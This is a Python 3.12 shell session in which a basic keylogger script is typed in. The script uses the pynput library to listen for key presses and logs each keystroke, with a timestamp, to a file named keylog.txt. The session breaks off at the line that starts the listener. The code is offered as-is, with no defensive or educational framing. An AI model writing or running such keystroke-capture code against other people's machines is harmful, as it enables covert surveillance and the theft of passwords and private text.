Python 3.12.0 (tags/v3.12.0:0fb18b0, Oct  2 2023, 13:03:39) [MSC v.1935 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license()" for more information.
>>> 
... 
... from pynput.keyboard import Key, Listener
... import logging
...  
... logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
...  
... def on_press(key):
...     logging.info(str(key))
...  
... with Listener(on_press=on_press) as listener :
